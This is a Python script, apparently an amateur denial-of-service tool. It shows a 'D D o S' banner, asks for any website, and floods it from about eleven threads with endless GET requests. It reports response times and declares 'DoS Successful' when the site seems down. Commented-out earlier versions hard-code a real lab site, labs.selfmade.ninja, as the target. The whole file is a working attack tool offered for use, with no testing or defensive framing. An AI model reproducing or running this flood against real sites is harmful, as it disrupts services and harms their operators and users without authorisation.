# import requests
# import threading
# import time
#
#
# def curr_milli_sec():
#     return int(time.time() * 1000)  # To return  current milliseconds
#
# #def count_req_per_min():
#
#
# def make_request(name):     # This function and loop will continuously send the request to the given website
#     while True:
#         s = curr_milli_sec()
#         r = requests.get('https://labs.selfmade.ninja/')
#         t = curr_milli_sec() - s
#         print("Response code from thread #{}: {} took {} ms".format(name, str(r.status_code), t))
#
#
#
# thread = 10
# while  thread >= 1:
#     x = threading.Thread(target=make_request, args=(thread,))       # This loop will Starting thread and display of how many thread that will created
#     print("Starting thread #{}...".format(thread))
#     x.start()
#     thread -= 1


# import requests
# import threading
# import time
#
# repList = []
#
#
# def curr_sec():
#     return int(time.time() * 1000)
#
#
# def count_rep_per_sec(time_took):
#     cs = curr_sec()
#     repList.append({
#         "time_took": time_took,
#         "time_received": t,
#     })
#
#
# def get_request(name):
#     while True:
#         cs = curr_sec()
#         r = requests.get('https://labs.selfmade.ninja/')
#         t = curr_sec() - cs
#         print("Response code form the thread #{}:{} took {} ms".format(name, str(r.status_code), t))
#         count_rep_per_sec(t)
#
# thread = 10
# while thread >= 1:
#     x = threading.Thread(target=get_request, args=(thread,))
#     print("Starting thread #{}....".format(thread))
#     x.start()
#     thread -= 1


import requests
import threading
import time
import pyfiglet
from pyfiglet import figlet_format
from colorama import Fore


f = figlet_format("D D o S", font="slant")  # font=doh,slant
print(Fore.LIGHTRED_EX, f)
print("Give your website :")
website = input()
l = []
rl = []


def current_mil_time():
    return int(time.time() * 1000)


def current_sec_time():
    return int(time.time())


def count_resp_per_sec(time_took):
    t = current_sec_time()
    l.append({
        "time_took": time_took,
        "time_received": t,
    })
    for e in l:
        if current_sec_time() - e["time_received"] >= 1:
            l.remove(e)


def count_req_per_sec():
    t = current_sec_time()
    rl.append({
        "time_received": t,
    })

    for e in rl:
        if  current_sec_time() - e["time_received"] >= 1:
            rl.remove(e)


message = "DoSing..."


def make_request(name):
    while True:
        # count_req_per_sec()
        try:
            s = current_mil_time()
            r = requests.get(website)
            time_took = current_mil_time() - s
            count_resp_per_sec(time_took)
        except:
            message = "DoS Successful. Site looks down for now."


if website.startswith("https"):
    threads = 10
    while threads >= 0:
        x = threading.Thread(target=make_request, args=(threads,))
        print("Starting thread #{}...".format(threads))
        x.start()
        threads -= 1

    print("Calculating... wait for a while for it to adjust...")
    # time.sleep(1)
    # response_time = 0
    while True:
        time.sleep(1)
        response_time = 0
        for e in l:
            response_time = response_time + e['time_took']
        if (len(l)) > 0:
            response_time = response_time / len(l)
        if response_time > 60000:
            message = "Dos Successfull. Site looks down for now."
        else:
            message = "DoSing...."
        print("\rAverage response time: {}ms; Requests/sec: {}; Responses/sec: {}; {}".format(round(response_time , 2),
                                                                                              len(rl), len(l), message),
              end="")
else:
    print("Give this format [https://www.google.com/]")